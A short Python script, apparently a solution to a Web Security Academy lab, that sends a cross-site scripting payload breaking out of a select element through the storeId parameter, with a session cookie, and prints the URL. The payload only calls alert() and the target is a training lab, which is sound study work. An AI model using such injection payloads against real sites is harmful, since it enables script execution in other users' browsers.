import requests

url = "https://0aec0032038b86c2c09c6f0f0081005a.web-security-academy.net/"
cookies = {
	"session": "wzJKTphATvxybJnZkPmp4K84oo0cmSwR"
}

PAYLOAD = "</option></select><script>alert()</script><!--"

params = { 
	"productId": "1",
	"storeId": PAYLOAD 
}

r = requests.get(url + "product", params=params, cookies=cookies)

print(r.url)